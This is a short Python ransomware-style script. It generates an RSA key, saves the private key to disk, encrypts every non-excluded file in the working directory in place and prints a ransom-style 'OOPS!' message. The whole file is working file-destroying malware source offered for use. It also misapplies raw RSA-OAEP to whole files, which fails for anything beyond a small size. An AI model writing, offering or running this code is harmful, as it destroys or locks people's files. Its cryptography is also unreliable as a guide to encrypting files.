#!/usr/bin/env python3

import os
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

files = os.listdir()
targets = []
current_key = 'rsa_key.pem'
excluded_files = ('.py', '.pem', '.md')


def encrypt_file_rsa(file_path, public_key):
    with open(file_path, 'rb') as file:
        plaintext = file.read()
        cipher_text = public_key.encrypt(
            plaintext,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
    with open(file_path, 'wb') as file:
        file.write(cipher_text)


def generate_rsa_key():
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()
    return private_key, public_key


if not os.path.exists(current_key):
    private_key, public_key = generate_rsa_key()

    with open(current_key, 'wb') as key_file:
        key_file.write(private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        ))

    for file in files:
        file_extension = os.path.splitext(file)[1].lower()

        if file_extension in excluded_files:
            continue

        if os.path.isdir(os.path.abspath(file)):
            continue

        targets.append(file)
        encrypt_file_rsa(file, public_key)

    print('OOPS! Your Files Have Been Encrypted!')
else:
    print('Your Files Are Already Encrypted!')
